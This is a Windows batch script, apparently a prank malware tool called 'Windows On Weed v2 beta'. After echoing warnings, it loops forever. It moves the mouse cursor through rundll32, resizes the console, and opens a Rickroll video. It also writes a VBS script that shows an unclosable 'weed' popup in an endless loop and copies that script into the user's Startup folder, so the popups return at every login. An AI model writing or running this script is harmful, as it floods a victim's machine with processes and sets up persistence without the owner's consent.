@echo off
title Windows On Weed v2 beta
echo Windows On Weed v2 beta
echo WARNING: Using this tool is highly disruptive, unethical, and may cause harm or damage to systems or data. Use at your own risk!
echo WARNING: This version includes opening a Rickroll video, flashing screens, random crap on the screen, and an unclosable VBS script that spams "weed" on startup. Proceed with extreme caution!

pause

:start
rundll32 user32.dll,SetCursorPos -32000,-32000
timeout /t 1 /nobreak >nul
rundll32 user32.dll,SetCursorPos 32000,32000
timeout /t 1 /nobreak >nul

mode con:cols=1 lines=1
timeout /t 1 /nobreak >nul
mode con:cols=80 lines=25
timeout /t 1 /nobreak >nul

start https://www.youtube.com/watch?v=dQw4w9WgXcQ

echo Set objShell = WScript.CreateObject("WScript.Shell") > weed.vbs
echo Do >> weed.vbs
echo     objShell.Popup "weed",0,"Windows On Weed",0+16 >> weed.vbs
echo Loop >> weed.vbs

copy weed.vbs "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

goto start
